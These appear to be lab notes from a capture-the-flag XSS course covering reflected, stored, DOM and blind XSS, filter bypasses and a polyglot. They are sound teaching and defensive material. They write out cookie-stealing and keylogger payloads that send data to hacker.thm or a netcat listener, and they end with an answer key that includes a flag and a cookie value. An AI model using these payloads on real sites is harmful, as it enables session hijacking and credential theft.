# **Cross-Site Scripting (XSS)**

## **Overview**

Cross-Site Scripting (XSS) is a web vulnerability that allows attackers to inject malicious JavaScript into web applications. When other users access the vulnerable page, the injected script executes in their browser.

XSS attacks can:

* Steal user sessions  
* Capture keystrokes  
* Redirect users  
* Manipulate website functionality  
* Perform actions as the victim user

The injected JavaScript is known as the **payload**.

There are several types of XSS vulnerabilities:

* Reflected XSS  
* Stored XSS  
* DOM-Based XSS  
* Blind XSS

Each type differs in how the payload is delivered and executed.

## **Key Takeaways**

* XSS vulnerabilities allow attackers to execute JavaScript in a victim’s browser.  
* The malicious JavaScript is called a payload.  
* XSS attacks commonly target:  
  * Session cookies  
  * User credentials  
  * Website functionality  
* Different XSS types require different payload techniques.  
* Poor input validation and output sanitization are the main causes.

# **What is an XSS Payload?**

## **Definition**

A payload is the JavaScript code attackers want to execute on a victim’s browser.

A payload has two parts:

* Intention  
* Modification

### **Intention**

What the attacker wants the code to do:

* Display alerts  
* Steal cookies  
* Log keystrokes  
* Change account settings

### **Modification**

Adjustments made so the payload executes correctly depending on:

* HTML context  
* Filters  
* Input location

## **Common XSS Payloads**

### **Proof of Concept (PoC)**

Basic alert box:

\<script\>alert('XSS');\</script\>

Used to prove JavaScript execution.

---

### **Session Stealing**

\<script\>fetch('https://hacker.thm/steal?cookie=' \+ btoa(document.cookie));\</script\>

Purpose:

* Steal session cookies  
* Hijack user accounts

---

### **Keylogger**

\<script\>document.onkeypress \= function(e) { fetch('https://hacker.thm/log?key=' \+ btoa(e.key) );}\</script\>

Purpose:

* Capture typed credentials  
* Record sensitive information

---

### **Business Logic Abuse**

\<script\>user.changeEmail('attacker@hacker.thm');\</script\>

Purpose:

* Abuse website functions  
* Change account settings

# **Reflected XSS**

## **Overview**

Reflected XSS occurs when:

* User input is reflected immediately in the response  
* No proper sanitization exists

### **Example**

https://site.thm/error?message=\<script\>alert(1)\</script\>

The payload executes directly in the response page.

## **Common Testing Areas**

* URL query parameters  
* URL paths  
* HTTP headers

## **Potential Impact**

Attackers may:

* Send malicious links  
* Steal sessions  
* Redirect users

## **Important Question**

Where in a URL is a good place to test for reflected XSS?  
 **Query String Parameters**

# **Stored XSS**

## **Overview**

Stored XSS occurs when:

* Malicious input is stored permanently  
* Payload executes whenever users view the content

## **Common Vulnerable Features**

* Blog comments  
* User profiles  
* Support tickets  
* Product reviews

## **Potential Impact**

Stored XSS is dangerous because:

* Multiple users become affected  
* Payload persists on the server

## **Important Question**

How are stored XSS payloads usually stored on a website?  
 **In a database**

# **DOM-Based XSS**

## **What is the DOM?**

DOM stands for:

Document Object Model

The DOM represents:

* HTML structure  
* Page content  
* Browser-side document handling

## **DOM XSS Overview**

DOM-Based XSS happens entirely in the browser.

The vulnerability occurs when JavaScript:

* Reads attacker-controlled input  
* Writes it into the page unsafely

## **Dangerous JavaScript Methods**

Example unsafe method:

eval()

## **Common Sources**

* window.location  
* document.URL  
* location.hash

## **Important Question**

What unsafe JavaScript method is good to look for in source code?  
 **eval()**

# **Blind XSS**

## **Overview**

Blind XSS is similar to Stored XSS, but:

* The attacker cannot see execution directly  
* Payload executes in another user’s interface

Example targets:

* Admin dashboards  
* Support portals  
* Moderation systems

## **Detection**

Blind XSS payloads usually:

* Send callbacks  
* Exfiltrate data

## **Common Tool**

XSS Hunter Express

## **Important Questions**

What tool can you use to test for Blind XSS?  
 **XSS Hunter Express**

What type of XSS is very similar to Blind XSS?  
 **Stored XSS**

# **XSS Payload Escaping Techniques**

## **Level One – Basic Script Injection**

### **Payload**

\<script\>alert('THM');\</script\>

Works because input is reflected directly into HTML.

---

## **Level Two – Escaping Input Attributes**

### **Payload**

"\>\<script\>alert('THM');\</script\>

### **Why It Works**

* " closes the attribute  
* \> closes the tag  
* Script executes afterward

---

## **Level Three – Escaping Textarea**

### **Payload**

\</textarea\>\<script\>alert('THM');\</script\>

### **Why It Works**

Closes the textarea before injecting JavaScript.

---

## **Level Four – Escaping JavaScript Context**

### **Payload**

';alert('THM');//

### **Why It Works**

* ' closes the string  
* ; terminates the statement  
* // comments remaining code

---

## **Level Five – Filter Bypass**

### **Original Payload**

\<script\>alert('THM');\</script\>

### **Bypass Payload**

\<sscriptcript\>alert('THM');\</sscriptcript\>

### **Why It Works**

The filter removes:

script

leaving behind:

\<script\>alert('THM');\</script\>  
---

## **Level Six – Event Handler Injection**

### **Payload**

/images/cat.jpg" onload="alert('THM');

### **Why It Works**

Injects an additional HTML attribute:

onload

which executes JavaScript when the image loads.

# **XSS Polyglots**

## **Overview**

A polyglot payload:

* Works across multiple contexts  
* Escapes tags and filters  
* Executes in many environments

### **Example Polyglot**

jaVasCript:/\*-/\*\`/\*\\\`/\*'/\*"/\*\*/(/\* \*/onerror=alert('THM') )//

Polyglots are commonly used in advanced XSS testing.

# **Blind XSS Exploitation Lab**

## **Scenario**

A support ticket system stores user messages.

The ticket content is reflected inside a:

\<textarea\>

element.

## **Escaping the Textarea**

### **Payload**

\</textarea\>\<script\>alert('THM');\</script\>

Successfully executes JavaScript.

## **Cookie Stealing Payload**

### **Netcat Listener**

nc \-nlvp 9001

### **Blind XSS Payload**

\</textarea\>\<script\>fetch('http://IP:9001?cookie=' \+ btoa(document.cookie) );\</script\>

### **Purpose**

* Extract victim cookies  
* Send them to attacker-controlled listener

## **Additional Information**

### **Common XSS Targets**

| Target | Purpose |
| ----- | ----- |
| Session Cookies | Account hijacking |
| Login Forms | Credential theft |
| Admin Panels | Privilege escalation |
| Support Systems | Blind XSS |

### **Common Defenses**

Developers should:

* Sanitize input  
* Escape output  
* Use Content Security Policy (CSP)  
* Validate user input  
* Disable inline scripts

# **Questions and Answers**

Which document property could contain the user's session token?  
 **document.cookie**

Which JavaScript method is often used as a Proof Of Concept?  
 **alert()**

Where in a URL is a good place to test for reflected XSS?  
 **Query String Parameters**

How are stored XSS payloads usually stored on a website?  
 **Database**

What unsafe JavaScript method is good to look for in source code?  
 **eval()**

What tool can you use to test for Blind XSS?  
 **XSS Hunter Express**

What type of XSS is very similar to Blind XSS?  
 **Stored XSS**

What is the flag you received from level six?  
 **THM{XSS\_MASTER\_PAYLOAD}**

What is the value of the staff-session cookie?  
 **4AB305E55955197693F01D6F8FD2D321**

